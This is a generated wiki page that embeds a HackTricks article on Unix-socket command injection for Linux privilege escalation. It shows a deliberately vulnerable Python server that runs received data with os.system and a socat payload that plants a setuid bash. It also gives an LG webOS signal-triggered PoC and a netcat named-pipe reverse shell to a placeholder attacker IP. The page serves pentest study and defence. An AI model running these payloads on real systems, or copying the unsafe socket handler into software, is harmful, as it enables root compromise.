@@ -1,0 +1,68 @@
+---
+parsed_by: focuslocust
+source: hacktricks
+type: generated
+---
+# Socket Command Injection
+
+[Home](../../../README.md)
+
+## Provenance
+
+| Field | Value |
+| --- | --- |
+| Source | `hacktricks` |
+| Type | `hacktricks-topic` |
+| Record ID | `hacktricks-linux-hardening-privilege-escalation-socket-command-injection` |
+| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/linux-hardening/privilege-escalation/socket-command-injection.md` |
+| Parsed by | `focuslocust` |
+| Relationship mode | `explicit / conservative inferred / manual` |
+
+## Generated Concept Page
+
+- [Socket Command Injection](../../topics/linux-hardening/socket-command-injection.md)
+
+## Extracted Fields
+
+| Field | Value |
+| --- | --- |
+| id | hacktricks-linux-hardening-privilege-escalation-socket-command-injection |
+| name | Socket Command Injection |
+| type | hacktricks-topic |
+| source | hacktricks |
+| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/linux-hardening/privilege-escalation/socket-command-injection.md |
+
+## Preserved Source Material
+
+````yaml
+_body: "# Socket Command Injection\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Socket binding example with\
+  \ Python\n\nIn the following example a **unix socket is created** (`/tmp/socket_test.s`) and everything **received** is\
+  \ going to be **executed** by `os.system`.I know that you aren't going to find this in the wild, but the goal of this example\
+  \ is to see how a code using unix sockets looks like, and how to manage the input in the worst case possible.\n\n```python:s.py\n\
+  import socket\nimport os, os.path\nimport time\nfrom collections import deque\n\nif os.path.exists(\"/tmp/socket_test.s\"\
+  ):\n  os.remove(\"/tmp/socket_test.s\")\n\nserver = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\nserver.bind(\"/tmp/socket_test.s\"\
+  )\nos.system(\"chmod o+w /tmp/socket_test.s\")\nwhile True:\n  server.listen(1)\n  conn, addr = server.accept()\n  datagram\
+  \ = conn.recv(1024)\n  if datagram:\n    print(datagram)\n    os.system(datagram)\n    conn.close()\n```\n\n**Execute**\
+  \ the code using python: `python s.py` and **check how the socket is listening**:\n\n```python\nnetstat -a -p --unix | grep\
+  \ \"socket_test\"\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to\
+  \ be root to see it all.)\nunix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s\n\
+  ```\n\n**Exploit**\n\n```python\necho \"cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;\" | socat - UNIX-CLIENT:/tmp/socket_test.s\n\
+  ```\n\n## Case study: Root-owned UNIX socket signal-triggered escalation (LG webOS)\n\nSome privileged daemons expose a\
+  \ root-owned UNIX socket that accepts untrusted input and couples privileged actions to thread-IDs and signals. If the protocol\
+  \ lets an unprivileged client influence which native thread is targeted, you may be able to trigger a privileged code path\
+  \ and escalate.\n\nObserved pattern:\n- Connect to a root-owned socket (e.g., /tmp/remotelogger).\n- Create a thread and\
+  \ obtain its native thread id (TID).\n- Send the TID (packed) plus padding as a request; receive an acknowledgement.\n-\
+  \ Deliver a specific signal to that TID to trigger the privileged behaviour.\n\nMinimal PoC sketch:\n\n```python\nimport\
+  \ socket, struct, os, threading, time\n# Spawn a thread so we have a TID we can signal\nth = threading.Thread(target=time.sleep,\
+  \ args=(600,)); th.start()\n tid = th.native_id  # Python >=3.8\ns = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n\
+  s.connect(\"/tmp/remotelogger\")\ns.sendall(struct.pack('<L', tid) + b'A'*0x80)\ns.recv(4)  # sync\nos.kill(tid, 4)  # deliver\
+  \ SIGILL (example from the case)\n```\n\nTo turn this into a root shell, a simple named-pipe + nc pattern can be used:\n\
+  \n```bash\nrm -f /tmp/f; mkfifo /tmp/f\ncat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f\n```\n\nNotes:\n\
+  - This class of bugs arises from trusting values derived from unprivileged client state (TIDs) and binding them to privileged\
+  \ signal handlers or logic.\n- Harden by enforcing credentials on the socket, validating message formats, and decoupling\
+  \ privileged operations from externally supplied thread identifiers.\n\n## References\n\n- [LG WebOS TV Path Traversal,\
+  \ Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)\n\
+  \n{{#include ../../banners/hacktricks-training.md}}"
+_relative_path: linux-hardening/privilege-escalation/socket-command-injection.md
+_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/linux-hardening/privilege-escalation/socket-command-injection.md
+````
